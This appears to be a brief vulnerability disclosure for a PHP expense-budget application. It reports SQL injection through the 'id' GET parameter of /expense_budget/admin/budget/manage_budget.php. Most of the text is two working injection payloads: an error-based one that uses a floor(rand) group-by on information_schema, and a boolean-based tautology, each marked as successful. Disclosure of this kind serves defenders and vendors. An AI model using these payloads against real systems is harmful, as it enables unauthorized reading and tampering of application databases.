BUG\_Author：wucwu1

Vulnerability File: /expense\_budget/admin/budget/manage\_budget.php

GET parameter 'id' exists SQL injection vulnerability

Payload1: id=1' and (select 2 from(select count(\*),concat(0x55565758,(select (elt(888=888,1))),0x65666768,floor(rand(0)\*2))x from information\_schema.plugins group by x)a) and 'a'='a

Error-based SQL injection succeeds.

Payload2: id=1' and 777=777 and 'GSD'='GSD

The Boolean value is judged correctly, so the page is displayed normally.
